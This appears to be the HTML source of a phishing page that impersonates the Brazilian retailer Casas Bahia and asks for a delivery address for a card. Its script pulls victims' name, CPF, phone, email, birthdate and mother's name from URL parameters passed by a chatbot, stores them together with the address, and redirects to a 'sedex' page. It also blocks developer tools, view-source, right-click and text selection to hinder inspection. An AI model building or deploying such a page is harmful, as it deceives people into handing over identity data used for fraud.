<!DOCTYPE html><html lang="pt-BR"><head>
    <meta charset="UTF-8">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Endere√ßo de Entrega</title>
      <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>
    
    <!-- Facebook Pixel -->
    <script src="../js/facebook-pixel.js"></script>

    <style>
      * {
        box-sizing: border-box;
      }

      body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
        color: #2c3e50;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        line-height: 1.6;
      }

      .header {
        background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
        padding: 25px 0;
        text-align: center;
        border-bottom: 4px solid #0d64fb;
        box-shadow: 0 2px 15px rgba(13, 100, 251, 0.1);
        position: relative;
        overflow: hidden;
      }

      .header::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(13, 100, 251, 0.1), transparent);
        animation: shimmer 3s infinite;
      }

      @keyframes shimmer {
        0% { left: -100%; }
        100% { left: 100%; }
      }

      .header img {
        transition: transform 0.3s ease;
        filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
      }

      .header img:hover {
        transform: scale(1.05);
      }

      .progress-indicator {
        margin-top: 15px;
        color: #0d64fb;
        font-size: 0.9rem;
        font-weight: 500;
        text-transform: uppercase;
        letter-spacing: 1px;
      }

      .main-content {
        max-width: 520px;
        background: rgba(255, 255, 255, 0.95);
        backdrop-filter: blur(10px);
        text-align: left;
        padding: 2.5rem;
        border-radius: 20px;
        box-shadow: 
          0 8px 32px rgba(13, 100, 251, 0.15),
          0 4px 16px rgba(0, 0, 0, 0.1);
        margin: 50px auto;
        border: 1px solid rgba(255, 255, 255, 0.2);
        animation: fadeInUp 0.8s ease-out;
      }

      @keyframes fadeInUp {
        from {
          opacity: 0;
          transform: translateY(30px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .main-content h2 {
        text-align: center;
        color: #0d64fb;
        font-size: 1.8rem;
        font-weight: 600;
        margin-bottom: 0.5rem;
        text-shadow: 0 2px 4px rgba(13, 100, 251, 0.1);
      }

      .main-content p {
        text-align: center;
        color: #6c757d;
        margin-bottom: 2rem;
        font-size: 1.1rem;
      }

      .form-label {
        font-weight: 600;
        color: #495057;
        margin-bottom: 8px;
        display: block;
        font-size: 0.95rem;
        letter-spacing: 0.5px;
      }

      .form-control, .form-select {
        border: 2px solid #e9ecef;
        border-radius: 12px;
        padding: 12px 16px;
        font-size: 1rem;
        transition: all 0.3s ease;
        background-color: #fafafa;
      }

      .form-control:focus, .form-select:focus {
        border-color: #0d64fb;
        box-shadow: 0 0 0 0.2rem rgba(13, 100, 251, 0.15);
        background-color: white;
        outline: none;
      }

      .form-control:hover, .form-select:hover {
        border-color: #0d64fb;
        background-color: white;
      }

      .mb-3 {
        margin-bottom: 1.5rem;
      }

      .form-check {
        display: flex;
        align-items: center;
        gap: 8px;
        margin-top: 8px;
      }

      .form-check-input {
        width: 18px;
        height: 18px;
        accent-color: #0d64fb;
      }

      .form-check-label {
        font-size: 0.9rem;
        color: #6c757d;
        cursor: pointer;
        user-select: none;
      }

      .btn-custom {
        background: linear-gradient(135deg, #0d64fb 0%, #0056d2 100%);
        color: white;
        border: none;
        border-radius: 12px;
        padding: 16px 24px;
        width: 100%;
        font-weight: 600;
        font-size: 1.1rem;
        cursor: pointer;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 1px;
        margin-top: 1rem;
        box-shadow: 0 4px 15px rgba(13, 100, 251, 0.3);
      }

      .btn-custom:hover {
        background: linear-gradient(135deg, #0056d2 0%, #003d99 100%);
        transform: translateY(-2px);
        box-shadow: 0 6px 25px rgba(13, 100, 251, 0.4);
      }

      .btn-custom:active {
        transform: translateY(0);
        box-shadow: 0 2px 10px rgba(13, 100, 251, 0.3);
      }

      .d-flex {
        display: flex;
        gap: 1rem;
      }

      .align-items-center {
        align-items: center;
      }

      .flex-grow-1 {
        flex-grow: 1;
      }

      .me-2 {
        margin-right: 0.5rem;
      }

      .footer {
        background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
        border-top: 1px solid #e9ecef;
        text-align: center;
        padding: 20px;
        font-size: 0.85rem;
        color: #6c757d;
        margin-top: auto;
        box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.05);
      }

      /* Anima√ß√µes para inputs */
      .form-control, .form-select {
        position: relative;
      }

      .form-control:focus::placeholder {
        opacity: 0.5;
        transform: translateY(-2px);
      }

      /* Responsividade melhorada */
      @media (max-width: 768px) {
        .main-content {
          margin: 20px 15px;
          padding: 2rem 1.5rem;
          border-radius: 16px;
        }

        .header {
          padding: 20px 0;
        }

        .header img {
          width: 100px;
        }

        .main-content h2 {
          font-size: 1.5rem;
        }

        .d-flex {
          flex-direction: column;
          gap: 1rem;
        }

        .form-check {
          margin-top: 0;
        }
      }

      /* Loading animation */
      .loading {
        opacity: 0.7;
        pointer-events: none;
      }

      .loading .btn-custom {
        background: #6c757d;
        cursor: not-allowed;
      }

      /* Error states */
      .form-control.error {
        border-color: #dc3545;
        background-color: #fff5f5;
      }

      .form-control.error:focus {
        box-shadow: 0 0 0 0.2rem rgba(220, 53, 69, 0.15);
      }
    </style>
  <script async="" defer="" src="js/pixel.js"></script></head>
  <body style="user-select: none;">
  
    <div class="header">
      <img style="width: 120px" src="images/logo.svg" alt="Logo Casas Bahia">
    </div>

    <div class="main-content">
      <h2>üìç Endere√ßo de Entrega</h2>
      <p>Informe onde voc√™ deseja receber seu cart√£o com seguran√ßa</p>
      <form id="form-endereco">
        <div class="mb-3">
          <label for="cep" class="form-label">CEP *</label>
          <input type="text" class="form-control" id="cep" placeholder="00000-000" 
                 onblur="buscarCEP()" maxlength="9" autocomplete="postal-code">
        </div>
        <div class="mb-3">
          <label for="rua" class="form-label">Rua *</label>
          <input type="text" class="form-control" id="rua" placeholder="Digite sua rua" 
                 autocomplete="address-line1">
        </div>
        <div class="mb-3 d-flex align-items-center">
          <div class="flex-grow-1 me-2">
            <label for="numero" class="form-label">N√∫mero *</label>
            <input type="text" class="form-control" id="numero" placeholder="123" 
                   autocomplete="address-line2">
          </div>
          <div class="form-check">
            <input class="form-check-input" type="checkbox" id="sem-numero">
            <label class="form-check-label" for="sem-numero">Sem n√∫mero</label>
          </div>
        </div>
        <div class="mb-3">
          <label for="complemento" class="form-label">Complemento</label>
          <input type="text" class="form-control" id="complemento" 
                 placeholder="Apto, bloco, casa..." autocomplete="address-line3">
        </div>
        <div class="mb-3">
          <label for="bairro" class="form-label">Bairro *</label>
          <input type="text" class="form-control" id="bairro" placeholder="Digite seu bairro" 
                 autocomplete="address-level2">
        </div>
        <div class="mb-3 d-flex">
          <div class="flex-grow-1 me-2">
            <label for="cidade" class="form-label">Cidade *</label>
            <input type="text" class="form-control" id="cidade" placeholder="Digite sua cidade" 
                   autocomplete="address-level1">
          </div>
          <div>
            <label for="estado" class="form-label">Estado *</label>
            <select class="form-select" id="estado" autocomplete="address-level1">
              <option value="">UF</option>
              <option value="AC">AC</option>
              <option value="AL">AL</option>
              <option value="AP">AP</option>
              <option value="AM">AM</option>
              <option value="BA">BA</option>
              <option value="CE">CE</option>
              <option value="DF">DF</option>
              <option value="ES">ES</option>
              <option value="GO">GO</option>
              <option value="MA">MA</option>
              <option value="MT">MT</option>
              <option value="MS">MS</option>
              <option value="MG">MG</option>
              <option value="PA">PA</option>
              <option value="PB">PB</option>
              <option value="PR">PR</option>
              <option value="PE">PE</option>
              <option value="PI">PI</option>
              <option value="RJ">RJ</option>
              <option value="RN">RN</option>
              <option value="RS">RS</option>
              <option value="RO">RO</option>
              <option value="RR">RR</option>
              <option value="SC">SC</option>
              <option value="SP">SP</option>
              <option value="SE">SE</option>
              <option value="TO">TO</option>
            </select>
          </div>
        </div>
        <button type="button" class="btn-custom" onclick="salvarEndereco()">
          Confirmar endere√ßo
        </button>
      </form>
    </div>

    <script>
      // Fun√ß√£o para formatar CEP automaticamente
      function formatarCEP(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length <= 8) {
          value = value.replace(/(\d{5})(\d)/, '$1-$2');
          input.value = value;
        }
      }      // Salvar dados do usu√°rio no localStorage quando a p√°gina carregar
      document.addEventListener('DOMContentLoaded', function() {
        // Fun√ß√£o para salvar dados do usu√°rio vindos do Typebot
        function saveUserDataFromURL() {
          const urlParams = new URLSearchParams(window.location.search);
          const userData = {};
          
          // Lista de par√¢metros de dados do usu√°rio vindos do Typebot
          const userDataKeys = [
            'name', 'nome', 'full_name', 'fullname',
            'cpf', 'documento', 'doc',
            'phone', 'telefone', 'celular', 'whatsapp',
            'email', 'e_mail',
            'birthdate', 'nascimento', 'data_nascimento',
            'mother_name', 'nome_mae'
          ];
          
          // Capturar todos os dados do usu√°rio
          userDataKeys.forEach(key => {
            const value = urlParams.get(key);
            if (value && value.trim()) {
              // Normalizar chaves para padr√£o consistente
              let normalizedKey = key;
              if (['nome', 'full_name', 'fullname'].includes(key)) normalizedKey = 'name';
              if (['documento', 'doc'].includes(key)) normalizedKey = 'cpf';
              if (['telefone', 'celular', 'whatsapp'].includes(key)) normalizedKey = 'phone';
              if (['e_mail'].includes(key)) normalizedKey = 'email';
              if (['nascimento', 'data_nascimento'].includes(key)) normalizedKey = 'birthdate';
              if (['nome_mae'].includes(key)) normalizedKey = 'mother_name';
              
              userData[normalizedKey] = value.trim();
            }
          });
          
          // Salvar dados individuais para compatibilidade
          if (userData.name) {
            localStorage.setItem('userName', userData.name);
            console.log('‚úÖ Nome salvo no localStorage:', userData.name);
          }
          
          if (userData.cpf) {
            localStorage.setItem('userCPF', userData.cpf);
            console.log('‚úÖ CPF salvo no localStorage:', userData.cpf);
          }
          
          if (userData.phone) {
            localStorage.setItem('userPhone', userData.phone);
            console.log('‚úÖ Telefone salvo no localStorage:', userData.phone);
          }
          
          if (userData.email) {
            localStorage.setItem('userEmail', userData.email);
            console.log('‚úÖ Email salvo no localStorage:', userData.email);
          }
          
          // Salvar objeto consolidado
          if (Object.keys(userData).length > 0) {
            localStorage.setItem('userData', JSON.stringify(userData));
            console.log('‚úÖ Dados completos do usu√°rio salvos no localStorage:', userData);
          }
          
          return userData;
        }
        
        // Fun√ß√£o para salvar par√¢metros de tracking
        function saveTrackingParams() {
          const urlParams = new URLSearchParams(window.location.search);
          const trackingParams = {};
          
          // Lista completa de par√¢metros de tracking
          const trackingKeys = [
            // UTM padr√£o
            'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id',
            // Facebook
            'fbclid', 'fbc', 'fbp', 'fb_action_ids', 'fb_action_types', 'fb_source',
            // Google
            'gclid', 'gclsrc', 'gbraid', 'wbraid',
            // Outros tracking
            'mc_cid', 'mc_eid', // Mailchimp
            'msclkid', // Microsoft
            'ttclid', // TikTok
            'li_fat_id', // LinkedIn
            'twclid', // Twitter
            'referrer', 'ref', 'source',
            // Par√¢metros customizados que podem vir do Typebot
            'campaign_id', 'ad_id', 'creative_id', 'keyword'
          ];
          
          trackingKeys.forEach(key => {
            const value = urlParams.get(key);
            if (value && value.trim()) {
              trackingParams[key] = value.trim();
            }
          });
          
          if (Object.keys(trackingParams).length > 0) {
            localStorage.setItem('trackingParams', JSON.stringify(trackingParams));
            console.log('‚úÖ Par√¢metros de tracking salvos:', trackingParams);
          }
          
          return trackingParams;
        }
        
        // Executar salvamento
        const savedUserData = saveUserDataFromURL();
        const savedTrackingParams = saveTrackingParams();
        
        // Limpar URL se dados foram salvos
        if (Object.keys(savedUserData).length > 0 || Object.keys(savedTrackingParams).length > 0) {
          // Aguardar um pouco para garantir que tudo foi salvo
          setTimeout(() => {
            cleanURLParams();
          }, 500);
        }// Facebook Pixel tracking
        if (typeof fbq !== 'undefined') {
          fbq('track', 'ViewContent', {
            content_name: 'P√°gina de Endere√ßo CEP',
            content_type: 'address_page',
            currency: 'BRL'
          });
          console.log('üéØ Facebook Pixel: ViewContent tracked for CEP page');
        }

        const cepInput = document.getElementById('cep');
        cepInput.addEventListener('input', function() {
          formatarCEP(this);
        });

        // Adicionar valida√ß√£o visual aos campos obrigat√≥rios
        const requiredFields = ['cep', 'rua', 'numero', 'bairro', 'cidade'];
        requiredFields.forEach(fieldId => {
          const field = document.getElementById(fieldId);
          if (field) {
            field.addEventListener('blur', function() {
              validateField(this);
            });
            field.addEventListener('input', function() {
              if (this.classList.contains('error')) {
                this.classList.remove('error');
              }
            });
          }
        });

        // Checkbox "sem n√∫mero" functionality
        const semNumeroCheckbox = document.getElementById('sem-numero');
        const numeroInput = document.getElementById('numero');
        
        semNumeroCheckbox.addEventListener('change', function() {
          if (this.checked) {
            numeroInput.disabled = true;
            numeroInput.value = '';
            numeroInput.style.opacity = '0.5';
          } else {
            numeroInput.disabled = false;
            numeroInput.style.opacity = '1';
          }
        });
      });

      function validateField(field) {
        if (!field.value.trim()) {
          field.classList.add('error');
          return false;
        }
        field.classList.remove('error');
        return true;
      }

      function showLoading(show) {
        const form = document.getElementById('form-endereco');
        if (show) {
          form.classList.add('loading');
        } else {
          form.classList.remove('loading');
        }
      }

      function buscarCEP() {
        const cepInput = document.getElementById("cep");
        const cep = cepInput.value.replace(/\D/g, '');
        
        if (cep.length !== 8) {
          cepInput.classList.add('error');
          return;
        }

        showLoading(true);
        
        fetch(`https://viacep.com.br/ws/${cep}/json/`)
          .then((response) => response.json())
          .then((data) => {
            showLoading(false);
            if (!data.erro) {
              document.getElementById("rua").value = data.logradouro || "";
              document.getElementById("bairro").value = data.bairro || "";
              document.getElementById("cidade").value = data.localidade || "";
              document.getElementById("estado").value = data.uf || "";
              
              // Remover classe de erro se CEP foi encontrado
              cepInput.classList.remove('error');
              
              // Focar no pr√≥ximo campo vazio
              const numeroInput = document.getElementById("numero");
              if (!numeroInput.disabled) {
                numeroInput.focus();
              }
            } else {
              cepInput.classList.add('error');
              console.error("CEP n√£o encontrado.");
              alert("CEP n√£o encontrado. Por favor, verifique o CEP digitado.");
            }
          })
          .catch(() => {
            showLoading(false);
            cepInput.classList.add('error');
            console.error("Erro ao buscar o CEP.");
            alert("Erro ao buscar o CEP. Verifique sua conex√£o com a internet.");          });      }      
      
      // Fun√ß√£o para limpar par√¢metros da URL mantendo apenas a URL base
      function cleanURLParams() {
        try {
          const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
          
          // Usar replaceState para n√£o adicionar nova entrada no hist√≥rico
          if (window.history && window.history.replaceState) {
            window.history.replaceState({}, document.title, cleanUrl);
            console.log('üßπ URL limpa. Dados preservados no localStorage.');
          }
        } catch (error) {
          console.warn('N√£o foi poss√≠vel limpar a URL:', error);
        }
      }
      
      // Fun√ß√£o para redirecionar preservando apenas par√¢metros de tracking
      function redirectWithTrackingParams(targetUrl) {
        try {
          // Recuperar apenas par√¢metros de tracking do localStorage
          const trackingParams = JSON.parse(localStorage.getItem('trackingParams') || '{}');
          
          if (Object.keys(trackingParams).length > 0) {
            const url = new URL(targetUrl, window.location.origin);
            
            // Adicionar apenas par√¢metros de tracking √† URL de destino
            Object.keys(trackingParams).forEach(key => {
              if (trackingParams[key]) {
                url.searchParams.append(key, trackingParams[key]);
              }
            });
            
            console.log('üîó Redirecionando com par√¢metros de tracking preservados:', url.toString());
            window.location.href = url.toString();
          } else {
            // Se n√£o h√° par√¢metros de tracking, redirecionar normalmente
            console.log('üîó Redirecionando sem par√¢metros:', targetUrl);
            window.location.href = targetUrl;
          }
        } catch (error) {
          // Fallback em caso de erro
          console.warn('Erro ao processar redirecionamento:', error);
          window.location.href = targetUrl;
        }
      }
      
      // Fun√ß√£o para validar se dados essenciais est√£o salvos
      function validateSavedData() {
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const requiredFields = ['name', 'cpf'];
        
        for (let field of requiredFields) {
          if (!userData[field]) {
            console.warn(`‚ö†Ô∏è Campo obrigat√≥rio '${field}' n√£o encontrado no localStorage`);
            return false;
          }
        }
        
        console.log('‚úÖ Dados essenciais validados no localStorage');
        return true;
      }

      // Fun√ß√£o para redirecionar preservando apenas par√¢metros de tracking (VERS√ÉO ANTIGA - REMOVIDA)      
      function salvarEndereco() {
        // Validar se dados do usu√°rio est√£o salvos antes de prosseguir
        if (!validateSavedData()) {
          alert("Erro: Dados do usu√°rio n√£o foram salvos corretamente. Por favor, recarregue a p√°gina.");
          return;
        }

        const semNumeroChecked = document.getElementById("sem-numero").checked;
        
        const endereco = {
          cep: document.getElementById("cep").value,
          rua: document.getElementById("rua").value,
          numero: semNumeroChecked
            ? "Sem n√∫mero"
            : document.getElementById("numero").value,
          complemento: document.getElementById("complemento").value,
          bairro: document.getElementById("bairro").value,
          cidade: document.getElementById("cidade").value,
          estado: document.getElementById("estado").value,
        };

        // Valida√ß√£o com feedback visual
        let isValid = true;
        const requiredFields = ['cep', 'rua', 'bairro', 'cidade', 'estado'];
        
        // Verificar n√∫mero apenas se n√£o estiver marcado "sem n√∫mero"
        if (!semNumeroChecked) {
          requiredFields.push('numero');
        }

        requiredFields.forEach(fieldName => {
          const field = document.getElementById(fieldName);
          if (!endereco[fieldName] || endereco[fieldName].trim() === '') {
            field.classList.add('error');
            isValid = false;
          } else {
            field.classList.remove('error');
          }
        });

        if (!isValid) {
          alert("Por favor, preencha todos os campos obrigat√≥rios.");
          // Focar no primeiro campo com erro
          const firstErrorField = document.querySelector('.form-control.error');
          if (firstErrorField) {
            firstErrorField.focus();
          }
          return;        }        // Mostrar loading no bot√£o
        showLoading(true);
        
        // Simular um pequeno delay para melhor UX e salvar dados
        setTimeout(() => {
          // Salvar endere√ßo no localStorage
          localStorage.setItem("enderecoCliente", JSON.stringify(endereco));
          console.log('‚úÖ Endere√ßo salvo no localStorage:', endereco);
          
          // Log final do estado do localStorage antes do redirecionamento
          console.log('üìä Estado final do localStorage:');
          console.log('- userData:', localStorage.getItem('userData'));
          console.log('- trackingParams:', localStorage.getItem('trackingParams'));
          console.log('- enderecoCliente:', localStorage.getItem('enderecoCliente'));
          
          // Redirecionar preservando apenas par√¢metros de tracking
          redirectWithTrackingParams("../sedex/index.html");
        }, 500);
      }
    </script>

    <!-- Footer -->
    <div class="footer">
      Copyright ¬© 2025 Casas Bahia. Todos os direitos reservados.<br>

      Pol√≠tica de Privacidade | Termos de Uso Vendas e Reembolsos | Legal Mapa
      do Site
    </div>
    
      <script>
    // Impedir a tecla F12 (abre as ferramentas de desenvolvedor)
    document.addEventListener('keydown', function(e) {
        if (e.keyCode === 123) {  // F12
            e.preventDefault();
        }

        // Impedir Ctrl + Shift + I (Ferramentas de desenvolvedor)
        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
            e.preventDefault();
        }

        // Impedir Ctrl + U (exibir c√≥digo fonte)
        if (e.ctrlKey && e.keyCode === 85) {
            e.preventDefault();
        }
    });

    // Impedir o menu de contexto (bot√£o direito)
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });
</script>

<script>
    // Impedir a sele√ß√£o de texto em toda a p√°gina
    document.addEventListener('selectstart', function(e) {
        e.preventDefault();
    });

    // Tamb√©m bloqueia a sele√ß√£o via CSS
    document.body.style.userSelect = 'none';  // Para navegadores modernos
</script>
  

</body></html>